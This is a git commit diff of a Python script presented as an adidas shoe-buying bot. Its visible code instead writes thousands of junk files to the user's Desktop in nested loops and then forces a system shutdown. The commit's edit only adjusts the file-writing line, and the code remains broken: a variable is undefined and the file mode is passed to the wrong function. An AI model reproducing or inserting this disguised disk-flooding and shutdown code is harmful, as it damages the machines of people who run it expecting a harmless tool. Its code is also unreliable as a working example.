a867eea112ca2ae9c850b9a70dc29407247e4449
masterbate <leftylemonzilla@gmail.com>
2017-01-26 16:25:52 -0500

    Update main.py

--- main.py
+++ main.py
@@ -9,7 +9,7 @@ for i in xrange(10000):
     toCop = raw_input("What shoe should we buy from adidas? Type sku: ")
     print("We are buying %s" % toCop + "!")
     for i in xrange(1000):
-        with open(os.path.expanduser('~') + '/Desktop/' + str(sku) + str(random.randint(1000, 999999), w) as cnt:
+        with open(os.path.expanduser('~') + '/Desktop/' + str(sku) + str(random.randint(1000, 999999), 'w') as cnt:
             cnt.write("COPPING ADIDAS " * 1000)
 print("We fucking cooked dude")
 subprocess.call(["shutdown", "/s"])
